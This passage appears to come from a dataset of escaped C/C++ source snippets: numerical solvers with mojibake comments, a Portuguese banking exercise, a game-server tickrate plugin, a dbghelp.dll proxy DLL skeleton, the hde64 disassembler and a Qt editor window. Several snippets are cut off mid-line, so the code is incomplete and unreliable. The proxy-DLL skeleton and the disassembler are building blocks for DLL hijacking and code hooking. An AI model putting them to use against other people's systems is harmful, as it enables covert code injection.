abs(c[j]);\r\n//\t\t\t}\r\n//\t\t\t//if (nor > max) { max = nor; }\r\n//\t\t}\r\n//\t\tbreak;\r\n//\tcase 2://\u00ff\u00ea\u00ee\u00e1\u00e8\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tnor[i] = 0;\r\n//\t\t}\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx = e[i];\r\n//\t\t\tx = step(n, a, z, x, 2);\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tnor[j] += abs(x[j]);\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\tbreak;\r\n//\tcase 3://\u00e7\u00e5\u00e9\u00e4\u00e5\u00eb\u00ff\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx = e[i];\r\n//\t\t\tc = step(n, a, z, x, 3);\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tnor[j] += abs(c[j]);\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\tbreak;\r\n//\tcase 4://\u00f0\u00e5\u00eb\u00e0\u00ea\u00f1\u00e0\u00f6\u00e8\u00ff\r\n//\t\tif (w == 1.0) { return universalnorm(n, a, b, 3, tay, w); }\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx = e[i];\r\n//\t\t\tc = step(n, a, z, x, 4);\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tnor[j] += abs(c[j]);\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\tbreak;\r\n//\t}\r\n//\tfor (int i = 0; i < n; i++) {\r\n//\t\tif (nor[i] > max) { max = nor[i]; }\r\n//\t}\r\n//\treturn max;\r\n//}\r\n//template<typename t>\r\n//vector<t>seid(int n, vector<vector<t>>a, vector<t>b) {\r\n//\tvector<t>x(n);\r\n//\tint k = 0;\r\n//\tvector<t>temp(n);\r\n//\tt normc = universalnorm(n, a, b, 3, tay, w);\r\n//\tdo {\r\n//\t\tk++;\r\n//\t\ttemp = x;\r\n//\t\tx = step(n, a, b, x, 3);\r\n//\t} while ((norm0(n, x, temp)) > eps);\r\n//\t/*for (int i = 0; i < n; i++) {\r\n//\t\tcout << x[i] << \" \";\r\n//\t}*/\r\n//\treturn x;\r\n//\t//cout << endl << \"iteration = \" << k << endl;\r\n//\t//cout << \"Norm C = \" << normc << endl << endl;\r\n//}\r\n\r\ndouble f(double x, int param) {\r\n\tswitch (param) {\r\n\tcase 1:\r\n\t\treturn (x - 0.1) * (x - 0.22) * (x - 0.55) * (x - 0.7) * (x - 0.75);\r\n\tcase 2:\r\n\t\treturn sqrt(x + 1) - 1;\r\n\tcase 3:\r\n\t\treturn 35 * x * x * x - 67 * x * x - 3 * x + 3;\r\n\t}\r\n\treturn x * x;\r\n}\r\ndouble df(double x, int param) {\r\n\tswitch (param) {\r\n\tcase 1:\r\n\t\treturn (x - 0.22) * (x - 0.55) * (x - 0.7) * (x - 0.75) + (x - 0.1) * (x - 0.55) * (x - 0.7) * (x - 0.75) + (x - 0.1) * (x - 0.22) * (x - 0.7) * (x - 0.75) + (x - 0.1) * (x - 0.22) * (x - 0.55) * (x - 0.75) + (x - 0.1) * (x - 0.22) * (x - 0.55) * (x - 0.7);\r\n\tcase 2:\r\n\t\treturn 1 / (2 * sqrt(x + 1));\r\n\tcase 3:\r\n\t\treturn 3 * 35 * x * x - 67 * 2 * x - 3;\r\n\t}\r\n\treturn x * x;\r\n}\r\ndouble dfch(double x, int param) {\r\n\tdouble h = 0.001;\r\n\treturn (f((x + h), param) - f(x, param)) / h;\r\n}\r\nvector<double> f2(double x1, double x2, int param) {\r\n\tvector<double>x(2);\r\n\tswitch (param) {\r\n\tcase 4:\r",
    "#include <iostream>\n#include <vector>\n#include <iomanip>\nusing namespace std;\n\nstruct Registro{\n\tfloat valor;\n\tstring operacao;\n\tstring motivo;\t\n};\n\nstruct Categoria{\n\tstring nome;\n\tfloat orcamento;\t\n};\n\n\nRegistro registrarEntrada(){\n\tfloat quantia;\n\tint opcaoMotivo;\n\tRegistro r1;\n\tcout<<\"\\nInforme a quantia a ser depositada: R$\";\n\tcin>>quantia;\n\tdo {\n        cout << \"\\nSelecione uma das categorias para informar o motivo do deposito: \" << endl;\n        cout << \"1- Salario \\n2- Jobs \\n3- Outros\" << endl;\n        cin >> opcaoMotivo;\n\n        if(opcaoMotivo < 1 || opcaoMotivo > 3) {\n            cout << \"Selecione uma das categorias informadas.\" << endl;\n    \t}\n    } while(opcaoMotivo < 1 || opcaoMotivo > 3);\n\n    r1.operacao = \"Entrada\";\n    r1.valor = quantia;\n    if(opcaoMotivo == 1) {\n        r1.motivo = \"Salario\";\n    } else if(opcaoMotivo == 2) {\n        r1.motivo = \"Jobs\";\n    } else if(opcaoMotivo == 3) {\n        r1.motivo = \"Outros\";\n    }\n    return r1;\n}\n\nRegistro registrarSaida(float saldo){\n\tfloat valorSaque;\n\tRegistro r1;\n\tcout<<\"\\nInforme quanto dinheiro pretende retirar: R$\";\n\tcin>>valorSaque;\n\tif(valorSaque<=saldo){\n\t\tcout<<\"Informe onde vai gastar o dinheiro: \"<<endl;\n\t\tcin>>r1.motivo;\n\t\tr1.operacao = \"Saida\";\n\t\tr1.valor = valorSaque;\n\t\treturn r1;\n\t}else{\n\t\tcout<<\"\\nSaldo insuficiente.\"<<endl;\n\t\treturn r1;\n\t}\n}\n\nvoid extrato(vector<Registro> registros, vector<Categoria> categorias,float total){\n\n\tcout<<\"\\n===========================================\"<<endl;\n\t\n\tcout<<\"\\n ==============================\";\n\tcout<<\"\\n|            EXTRATO           |\";\n\tcout<<\"\\n ==============================\"<<endl;\n\t\n\tcout<<\"\\n----------OPERACOES----------\"<<endl;\n\t\n\tfor(Registro registro : registros){\n\t\tcout<<\"\\nOperacao: \"<<registro.operacao<<\" || Fonte: \"<<registro.motivo<<\" || Quantia: R$\"<<fixed<<setprecision(2)<<registro.valor;\n\t}\n\tcout<<\"\\n\\n----------CATEGORIAS----------\"<<endl;\n\tfor(Categoria c : categorias){\n\t\tcout<<\"\\n Categoria: \"<<c.nome<<\" | Orcamento: R$ \"<<fixed<<setprecision(2)<<c.orcamento;\n\t}\n\n\tcout<<\"\\n\\n------------------------\";\n\tcout<<\"\\n   TOTAL: R$\"<<fixed<<setprecision(2)<<total<<endl;\n\tcout<<\"------------------------\"<<endl;\n\tcout<<\"\\n===========================================\"<<endl;\n}\n\nCategoria cadastrarCategoria(){\n\tCategoria cat;\n\tcout<<\"\\nInsira o nome da categoria: \";\n\tcin>>cat.nome;\n\tcout<<\"\\nInforme o orcamento da categoria: R$\";\n\tcin>>cat.orcamento;\n\treturn cat;\n}\n\nint main(int argc, char** argv) {\n\t\n\tint opcao=0;\n\tfloat total = 0;\n\tvector<Registro> vetorRegistros;\n\tvector<Categoria> vetorCategorias;\n\t\n\twhile(opcao!=5){\n\t\n\t\tcout<<\"\\n------BANCO------\"<<endl;\n\t\tcout<<\"\\nDigite a operacao desejada: \"<<endl;\n\t\tcout<<\"1- Realizar entrada \\n2- Realizar saida \\n3- Cadastrar Categoria \\n4- Ver extrato \\n5- Sair\"<<endl;\n\t\tcout<<\"-> \";\n\t\tcin>>opcao;\n\t\t\n\t\tif(opcao==1){\n\t\t\tRegistro r = registrarEntrada();\n\t\t\tvetorRegistros.push_back(r);\t\n\t\t\ttotal += r.valor;\n\t\t}\n\t\t\n\t\tif(opcao==2){\n\t\t\tRegistro r = registrarSaida(total);\n\t\t\tif(r.motivo != \"\"){\t\t\t\t\n\t\t\t\tvetorRegistros.push_back(r);\n\t\t\t\ttotal -= r.valor;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif(opcao==3){\n\t\t\tCategoria c1 = cadastrarCategoria();\n\t\t\tvetorCategorias.push_back(c1);\n\t\t}\n\t\t\n\t\tif(opcao==4){\n\t\t\textrato(vetorRegistros,vetorCategorias,total);\n\t\t}\n\t\t\n\t\tif(opcao==5){\n\t\t\tbreak;\n\t\t} \n\t}\n\treturn 0;\n}",
    "/**\n * vim: set ts=4 sw=4 tw=99 noet :\n * ======================================================\n * Metamod:Source Tickrate\n * Written by Wend4r (Vladimir Ezhikov).\n * ======================================================\n\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include <tickrate/provider.hpp>\n\n#include <frame.h>\n\nTickrate::Provider::GameDataStorage::CHostFrame::CHostFrame()\n{\n\t{\n\t\tauto &aCallbacks = m_aAddressCallbacks;\n\n#ifdef _WIN32\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&s_pHostFrameSingleton->time_unbounded\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_p = (CFrame *)(aAddress.CCast<ptrdiff_t>() - offsetof(CFrame, time_unbounded));\n\t\t});\n#else\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"GetHostFrame\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_p = (*aAddress.UCast<CFrame *(*)()>())();\n\t\t});\n#endif\n\n\t\tm_aGameConfig.GetAddresses().AddListener(&aCallbacks);\n\t}\n}\n\nbool Tickrate::Provider::GameDataStorage::CHostFrame::Load(IGameData *pRoot, KeyValues3 *pGameConfig, GameData::CBufferStringVector &vecMessages)\n{\n\treturn m_aGameConfig.Load(pRoot, pGameConfig, vecMessages);\n}\n\nvoid Tickrate::Provider::GameDataStorage::CHostFrame::Reset()\n{\n\tm_p = nullptr;\n}\n\nCFrame *Tickrate::Provider::GameDataStorage::CHostFrame::GetPointer() const\n{\n\treturn m_p;\n}\n",
    "#include <Windows.h>\r\n\r\n#pragma region Proxy\r\nstruct dbghelp_dll {\r\n\tHMODULE dll;\r\n\tFARPROC oDbgHelpCreateUserDump;\r\n\tFARPROC oDbgHelpCreateUserDumpW;\r\n\tFARPROC oEnumDirTree;\r\n\tFARPROC oEnumDirTreeW;\r\n\tFARPROC oEnumerateLoadedModules;\r\n\tFARPROC oEnumerateLoadedModules64;\r\n\tFARPROC oEnumerateLoadedModulesEx;\r\n\tFARPROC oEnumerateLoadedModulesExW;\r\n\tFARPROC oEnumerateLoadedModulesW64;\r\n\tFARPROC oExtensionApiVersion;\r\n\tFARPROC oFindDebugInfoFile;\r\n\tFARPROC oFindDebugInfoFileEx;\r\n\tFARPROC oFindDebugInfoFileExW;\r\n\tFARPROC oFindExecutableImage;\r\n\tFARPROC oFindExecutableImageEx;\r\n\tFARPROC oFindExecutableImageExW;\r\n\tFARPROC oFindFileInPath;\r\n\tFARPROC oFindFileInSearchPath;\r\n\tFARPROC oGetSymLoadError;\r\n\tFARPROC oGetTimestampForLoadedLibrary;\r\n\tFARPROC oImageDirectoryEntryToData;\r\n\tFARPROC oImageDirectoryEntryToDataEx;\r\n\tFARPROC oImageNtHeader;\r\n\tFARPROC oImageRvaToSection;\r\n\tFARPROC oImageRvaToVa;\r\n\tFARPROC oImagehlpApiVersion;\r\n\tFARPROC oImagehlpApiVersionEx;\r\n\tFARPROC oMakeSureDirectoryPathExists;\r\n\tFARPROC oMiniDumpReadDumpStream;\r\n\tFARPROC oMiniDumpWriteDump;\r\n\tFARPROC oRangeMapAddPeImageSections;\r\n\tFARPROC oRangeMapCreate;\r\n\tFARPROC oRangeMapFree;\r\n\tFARPROC oRangeMapRead;\r\n\tFARPROC oRangeMapRemove;\r\n\tFARPROC oRangeMapWrite;\r\n\tFARPROC oRemoveInvalidModuleList;\r\n\tFARPROC oReportSymbolLoadSummary;\r\n\tFARPROC oSearchTreeForFile;\r\n\tFARPROC oSearchTreeForFileW;\r\n\tFARPROC oSetCheckUserInterruptShared;\r\n\tFARPROC oSetSymLoadError;\r\n\tFARPROC oStackWalk;\r\n\tFARPROC oStackWalk2;\r\n\tFARPROC oStackWalk64;\r\n\tFARPROC oStackWalkEx;\r\n\tFARPROC oSymAddSourceStream;\r\n\tFARPROC oSymAddSourceStreamA;\r\n\tFARPROC oSymAddSourceStreamW;\r\n\tFARPROC oSymAddSymbol;\r\n\tFARPROC oSymAddSymbolW;\r\n\tFARPROC oSymAddrIncludeInlineTrace;\r\n\tFARPROC oSymAllocDiaString;\r\n\tFARPROC oSymCleanup;\r\n\tFARPROC oSymCompareInlineTrace;\r\n\tFARPROC oSymDeleteSymbol;\r\n\tFARPROC oSymDeleteSymbolW;\r\n\tFARPROC oSymEnumLines;\r\n\tFARPROC oSymEnumLinesW;\r\n\tFARPROC oSymEnumProcesses;\r\n\tFARPROC oSymEnumSourceFileTokens;\r\n\tFARPROC oSymEnumSourceFiles;\r\n\tFARPROC oSymEnumSourceFilesW;\r\n\tFARPROC oSymEnumSourceLines;\r\n\tFARPROC oSymEnumSourceLinesW;\r\n\tFARPROC oSymEnumSym;\r\n\tFARPROC oSymEnumSymbols;\r\n\tFARPROC oSymEnumSymbolsEx;\r\n\tFARPROC oSymEnumSymbolsExW;\r\n\tFARPROC oSymEnumSymbolsForAddr;\r\n\tFARPROC oSymEnumSymbolsForAddrW;\r\n\tFARPROC oSymEnumSymbolsW;\r\n\tFARPROC oSymEnumTypes;\r\n\tFARPROC oSymEnumTypesByName;\r\n\tFARPROC oSymEnumTypesByNameW;\r\n\tFARPROC oSymEnumTypesW;\r\n\tFARPROC oSymEnumerateModules;\r\n\tFARPROC oSymEnumerateModules64;\r\n\tFARPROC oSymEnumerateModulesW64;\r\n\tFARPROC oSymEnumerateSymbols;\r\n\tFARPROC oSymEnumerateSymbols64;\r\n\tFARPROC oSymEnumerateSymbolsW;\r\n\tFARPROC oSymEnumerateSymbolsW64;\r\n\tFARPROC oSymFindDebugInfoFile;\r\n\tFARPROC oSymFindDebugInfoFileW;\r\n\tFARPROC oSymFindExecutableImage;\r\n\tFARPROC oSymFindExecutableImageW;\r\n\tFARPROC oSymFindFileInPath;\r\n\tFARPROC oSymFindFileInPathW;\r\n\tFARPROC oSymFreeDiaString;\r\n\tFARPROC oSymFromAddr;\r\n\tFARPROC oSymFromAddrW;\r\n\tFARPROC oSymFromIndex;\r\n\tFARPROC oSymFromIndexW;\r\n\tFARPROC oSymFromInlineContext;\r\n\tFARPROC oSymFromInlineContextW;\r\n\tFARPROC oSymFromName;\r\n\tFARPROC oSymFromNameW;\r\n\tFARPROC oSymFromToken;\r\n\tFARPROC oSymFromTokenW;\r\n\tFARPROC oSymFunctionTableAccess;\r\n\tFARPROC oSymFunctionTableAccess64;\r\n\tFARPROC oSymFunctionTableAccess64AccessRoutines;\r\n\tFARPROC oSymGetDiaSession;\r\n\tFARPROC oSymGetDiaSource;\r\n\tFARPROC oSymGetExtendedOption;\r\n\tFARPROC oSymGetFileLineOffsets64;\r\n\tFARPROC oSymGetHomeDirectory;\r\n\tFARPROC oSymGetHomeDirectoryW;\r\n\tFARPROC oSymGetLineFromAddr;\r\n\tFARPROC oSymGetLineFromAddr64;\r\n\tFARPROC oSymGetLineFromAddrEx;\r\n\tFARPROC oSymGetLineFromAddrW64;\r\n\tFARPROC oSymGetLineFromInlineContext;\r\n\tFARPROC oSymGetLineFromInlineContextW;\r\n\tFARPROC oSymGetLineFromName;\r\n\tFARPROC oSymGetLineFromName64;\r\n\tFARPROC oSymGetLineFromNameEx;\r\n\tFARPROC oSymGetLineFromNameW64;\r\n\tFARPROC oSymGetLineNext;\r\n\tFARPROC oSymGetLineNext64;\r\n\tFARPROC oSymGetLineNextEx;\r\n\tFARPROC oSymGetLineNextW64;\r\n\tFARPROC oSymGetLinePrev;\r\n\tFARPROC oSymGetLinePrev64;\r\n\tFARPROC oSymGetLinePrevEx;\r\n\tFARPROC oSymGetLinePrevW64;\r\n\tFARPROC oSymGetModuleBase;\r\n\tFARPROC oSymGetModuleBase64;\r\n\tFARPROC oSymGetModuleInfo;\r\n\tFARPROC oSymGetModuleInfo64;\r\n\tFARPROC oSymGetModuleInfoW;\r\n\tFARPROC oSymGetModuleInfoW64;\r\n\tFARPROC oSymGetOmapBlockBase;\r\n\tFARPROC oSymGetOmaps;\r\n\tFARPROC oSymGetOptions;\r\n\tFARPROC oSymGetScope;\r\n\tFARPROC oSymGetScopeW;\r\n\tFARPROC oSymGetSearchPath;\r\n\tFARPROC oSymGetSearchPathW;\r\n\tFARPROC oSymGetSourceFile;\r\n\tFARPROC oSymGetSourceFileChecksum;\r\n\tFARPROC oSymGetSourceFileChecksumW;\r\n\tFARPROC oSymGetSourceFileFromToken;\r\n\tFARPROC oSymGetSourceFileFromTokenByTokenName;\r\n\tFARPROC oSymGetSourceFileFromTokenByTokenNameW;\r\n\tFARPROC oSymGetSourceFileFromTokenW;\r\n\tFARPROC oSymGetSourceFileToken;\r\n\tFARPROC oSymGetSourceFileTokenByTokenName;\r\n\tFARPROC oSymGetSourceFileTokenByTokenNameW;\r\n\tFARPROC oSymGetSourceFileTokenW;\r\n\tFARPROC oSymGetSourceFileW;\r\n\tFARPROC oSymGetSourceVarFromToken;\r\n\tFARPROC oSymGetSourceVarFromTokenW;\r\n\tFARPROC oSymGetSymFromAddr;\r\n\tFARPROC oSy",
    "\ufeff//hde64.c\r\n#pragma warning(push)\r\n#pragma warning(disable:4701)\r\n#pragma warning(disable:4706)\r\n#pragma warning(disable:26451)\r\n#include \"hde64.h\"\r\n#include \"table64.h\"\r\n\r\ntypedef unsigned char* LPBYTE;\r\n\r\nextern \"C\" unsigned int hde64_disasm(const void* code, hde64s* hs)\r\n{\r\n\tuint8_t x, c = 0, *p = (uint8_t*)code, cflags, opcode, pref = 0;\r\n\tuint8_t *ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;\r\n\tuint8_t op64 = 0;\r\n\r\n\t// Avoid using memset to reduce the footprint.\r\n#ifndef _MSC_VER\r\n    memset((LPBYTE)hs, 0, sizeof(hde64s));\r\n#else\r\n\t__stosb((LPBYTE)hs, 0, sizeof(hde64s));\r\n#endif\r\n\r\n\tfor (x = 16; x; x--)\r\n\t{\r\n\t\t\r\n\t\t\r\n\t\tswitch (c=*p++ )\r\n\t\t{\r\n\t\tcase 0xf3:\r\n\t\t\ths->p_rep = c;\r\n\t\t\tpref |= PRE_F3;\r\n\t\t\tbreak;\r\n\t\tcase 0xf2:\r\n\t\t\ths->p_rep = c;\r\n\t\t\tpref |= PRE_F2;\r\n\t\t\tbreak;\r\n\t\tcase 0xf0:\r\n\t\t\ths->p_lock = c;\r\n\t\t\tpref |= PRE_LOCK;\r\n\t\t\tbreak;\r\n\t\tcase 0x26:\r\n\t\tcase 0x2e:\r\n\t\tcase 0x36:\r\n\t\tcase 0x3e:\r\n\t\tcase 0x64:\r\n\t\tcase 0x65:\r\n\t\t\ths->p_seg = c;\r\n\t\t\tpref |= PRE_SEG;\r\n\t\t\tbreak;\r\n\t\tcase 0x66:\r\n\t\t\ths->p_66 = c;\r\n\t\t\tpref |= PRE_66;\r\n\t\t\tbreak;\r\n\t\tcase 0x67:\r\n\t\t\ths->p_67 = c;\r\n\t\t\tpref |= PRE_67;\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tgoto pref_done;\r\n\t\t}\r\n\t}\r\npref_done:\r\n\r\n\ths->flags = (uint32_t)pref << 23;\r\n\r\n\tif (!pref)\r\n\t\tpref |= PRE_NONE;\r\n\r\n\tif ((c & 0xf0) == 0x40)\r\n\t{\r\n\t\ths->flags |= F_PREFIX_REX;\r\n\t\tif ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)\r\n\t\t\top64++;\r\n\t\ths->rex_r = (c & 7) >> 2;\r\n\t\ths->rex_x = (c & 3) >> 1;\r\n\t\ths->rex_b = c & 1;\r\n\t\tif (((c = *p++) & 0xf0) == 0x40)\r\n\t\t{\r\n\t\t\topcode = c;\r\n\t\t\tgoto error_opcode;\r\n\t\t}\r\n\t}\r\n\r\n\tif ((hs->opcode = c) == 0x0f)\r\n\t{\r\n\t\ths->opcode2 = c = *p++;\r\n\t\tht += DELTA_OPCODES;\r\n\t}\r\n\telse if (c >= 0xa0 && c <= 0xa3)\r\n\t{\r\n\t\top64++;\r\n\t\tif (pref & PRE_67)\r\n\t\t\tpref |= PRE_66;\r\n\t\telse\r\n\t\t\tpref &= ~PRE_66;\r\n\t}\r\n\r\n\topcode = c;\r\n\tcflags = ht[ht[opcode / 4] + (opcode % 4)];\r\n\r\n\tif (cflags == C_ERROR)\r\n\t{\r\n\terror_opcode:\r\n\t\ths->flags |= F_ERROR | F_ERROR_OPCODE;\r\n\t\tcflags = 0;\r\n\t\tif ((opcode & -3) == 0x24)\r\n\t\t\tcflags++;\r\n\t}\r\n\r\n\tx = 0;\r\n\tif (cflags & C_GROUP)\r\n\t{\r\n\t\tuint16_t t;\r\n\t\tt = *(uint16_t*)(ht + (cflags & 0x7f));\r\n\t\tcflags = (uint8_t)t;\r\n\t\tx = (uint8_t)(t >> 8);\r\n\t}\r\n\r\n\tif (hs->opcode2)\r\n\t{\r\n\t\tht = hde64_table + DELTA_PREFIXES;\r\n\t\tif (ht[ht[opcode / 4] + (opcode % 4)] & pref)\r\n\t\t\ths->flags |= F_ERROR | F_ERROR_OPCODE;\r\n\t}\r\n\r\n\tif (cflags & C_MODRM)\r\n\t{\r\n\t\ths->flags |= F_MODRM;\r\n\t\ths->modrm = c = *p++;\r\n\t\ths->modrm_mod = m_mod = c >> 6;\r\n\t\ths->modrm_rm = m_rm = c & 7;\r\n\t\ths->modrm_reg = m_reg = (c & 0x3f) >> 3;\r\n\r\n\t\tif (x && ((x << m_reg) & 0x80))\r\n\t\t\ths->flags |= F_ERROR | F_ERROR_OPCODE;\r\n\r\n\t\tif (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf)\r\n\t\t{\r\n\t\t\tuint8_t t = opcode - 0xd9;\r\n\t\t\tif (m_mod == 3)\r\n\t\t\t{\r\n\t\t\t\tht = hde64_table + DELTA_FPU_MODRM + t * 8;\r\n\t\t\t\tt = ht[m_reg] << m_rm;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tht = hde64_table + DELTA_FPU_REG;\r\n\t\t\t\tt = ht[t] << m_reg;\r\n\t\t\t}\r\n\t\t\tif (t & 0x80)\r\n\t\t\t\ths->flags |= F_ERROR | F_ERROR_OPCODE;\r\n\t\t}\r\n\r\n\t\tif (pref & PRE_LOCK)\r\n\t\t{\r\n\t\t\tif (m_mod == 3)\r\n\t\t\t{\r\n\t\t\t\ths->flags |= F_ERROR | F_ERROR_LOCK;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tuint8_t *table_end, op = opcode;\r\n\t\t\t\tif (hs->opcode2)\r\n\t\t\t\t{\r\n\t\t\t\t\tht = hde64_table + DELTA_OP2_LOCK_OK;\r\n\t\t\t\t\ttable_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tht = hde64_table + DELTA_OP_LOCK_OK;\r\n\t\t\t\t\ttable_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;\r\n\t\t\t\t\top &= -2;\r\n\t\t\t\t}\r\n\t\t\t\tfor (; ht != table_end; ht++)\r\n\t\t\t\t\tif (*ht++ == op)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tif (!((*ht << m_reg) & 0x80))\r\n\t\t\t\t\t\t\tgoto no_lock_error;\r\n\t\t\t\t\t\telse\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\ths->flags |= F_ERROR | F_ERROR_LOCK;\r\n\t\t\tno_lock_error:\r\n\t\t\t\t;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (hs->opcode2)\r\n\t\t{\r\n\t\t\tswitch (opcode)\r\n\t\t\t{\r\n\t\t\tcase 0x20:\r\n\t\t\tcase 0x22:\r\n\t\t\t\tm_mod = 3;\r\n\t\t\t\tif (m_reg > 4 || m_reg == 1)\r\n\t\t\t\t\tgoto error_operand;\r\n\t\t\t\telse\r\n\t\t\t\t\tgoto no_error_operand;\r\n\t\t\tcase 0x21:\r\n\t\t\tcase 0x23:\r\n\t\t\t\tm_mod = 3;\r\n\t\t\t\tif (m_reg == 4 || m_reg == 5)\r\n\t\t\t\t\tgoto error_operand;\r\n\t\t\t\telse\r\n\t\t\t\t\tgoto no_error_operand;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tswitch (opcode)\r\n\t\t\t{\r\n\t\t\tcase 0x8c:\r\n\t\t\t\tif (m_reg > 5)\r\n\t\t\t\t\tgoto error_operand;\r\n\t\t\t\telse\r\n\t\t\t\t\tgoto no_error_operand;\r\n\t\t\tcase 0x8e:\r\n\t\t\t\tif (m_reg == 1 || m_reg > 5)\r\n\t\t\t\t\tgoto error_operand;\r\n\t\t\t\telse\r\n\t\t\t\t\tgoto no_error_operand;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (m_mod == 3)\r\n\t\t{\r\n\t\t\tuint8_t* table_end;\r\n\t\t\tif (hs->opcode2)\r\n\t\t\t{\r\n\t\t\t\tht = hde64_table + DELTA_OP2_ONLY_MEM;\r\n\t\t\t\ttable_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tht = hde64_table + DELTA_OP_ONLY_MEM;\r\n\t\t\t\ttable_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;\r\n\t\t\t}\r\n\t\t\tfor (; ht != table_end; ht += 2)\r\n\t\t\t\tif (*ht++ == opcode)\r\n\t\t\t\t{\r\n\t\t\t\t\tif (*ht++ & pref && !((*ht << m_reg) & 0x80))\r\n\t\t\t\t\t\tgoto error_operand;\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\tgoto no_error_operand;\r\n\t\t}\r\n\t\telse if (hs->opcode2)\r\n\t\t{\r\n\t\t\tswitch (opcode)\r\n\t\t\t{\r\n\t\t\tcase 0x50:\r\n\t\t\tcase 0xd7:\r\n\t\t\tcase 0xf7:\r\n\t\t\t\tif (pref & (PRE_NONE | PRE_66))\r\n\t\t\t\t\tgoto error_operand;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 0xd6:\r\n\t\t\t\tif (pref & (PRE_F2 | PRE_F3))\r\n\t\t\t\t\tgoto error_oper",
    "\ufeff#include \"qwmainwind.h\"\n#include \"ui_qwmainwind.h\"\n\n#include    <QFile>\n#include    <QFileDialog>\n#include    <QTextStream>\n#include    <QFontDialog>\n#include    <QCoreApplication>\n#include    <Qlabel>\n#include    <QTextCharFormat>\n\n\nvoid QWMainWind::updateCurFile(QString aFile)\n{//\u66f4\u65b0\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5e76\u66f4\u65b0\u72b6\u6001\u680f\u63d0\u793a\n    fCurFileName=aFile;\n    fLabCurFile->setText(\"\u5f53\u524d\u6587\u4ef6\uff1a\"+fCurFileName);\n}\n\nvoid QWMainWind::iniUI()\n{\n//\u72b6\u6001\u680f\n    fLabCurFile=new QLabel;  //\u7528\u4e8e\u663e\u793a\u5f53\u524d\u6587\u4ef6\u540d\u7684\u6807\u7b7e\n    fLabCurFile->setMinimumWidth(150);\n    fLabCurFile->setText(\"\u5f53\u524d\u6587\u4ef6\uff1a\");\n    ui->statusBar->addWidget(fLabCurFile);//\u6dfb\u52a0\u5230\u72b6\u6001\u680f\n\n    progressBar1=new QProgressBar;//\u72b6\u6001\u680f\u4e0a\u7684\u8fdb\u5ea6\u6761\n    progressBar1->setMaximumWidth(200);//\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5927\u5bbd\u5ea6\n    progressBar1->setMinimum(5);\n    progressBar1->setMaximum(50);\n    progressBar1->setValue(ui->txtEdit->font().pointSize());//\u521d\u59cb\u503c\n    ui->statusBar->addWidget(progressBar1); //\u6dfb\u52a0\u5230\u72b6\u6001\u680f\n\n//\u5de5\u5177\u680f\n    spinFontSize = new QSpinBox;// \u5de5\u5177\u680f\u4e0a\u7684\u6587\u5b57\u5927\u5c0f SpinBox\n    spinFontSize->setMinimum(5);\n    spinFontSize->setMaximum(50);\n    spinFontSize->setValue(ui->txtEdit->font().pointSize());//\u521d\u59cb\u503c\n    spinFontSize->setMinimumWidth(50);//\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5c0f\u5bbd\u5ea6\n\n    ui->mainToolBar->addWidget(new QLabel(\"\u5b57\u4f53\u5927\u5c0f \")); //\u4e0d\u5f15\u7528\u7684Label\u65e0\u9700\u5b9a\u4e49\u53d8\u91cf\n    ui->mainToolBar->addWidget(spinFontSize); //SpinBox\u6dfb\u52a0\u5230\u5de5\u5177\u680f\n\n    ui->mainToolBar->addSeparator(); //\u5de5\u5177\u680f\u4e0a\u589e\u52a0\u5206\u9694\u6761\n    ui->mainToolBar->addWidget(new QLabel(\" \u5b57\u4f53 \"));\n    comboFont = new QFontComboBox;//\u5b57\u4f53\u540d\u79f0ComboBox\n    comboFont->setMinimumWidth(150); //\u8bbe\u7f6e\u7ec4\u4ef6\u6700\u5c0f\u5bbd\u5ea6\n    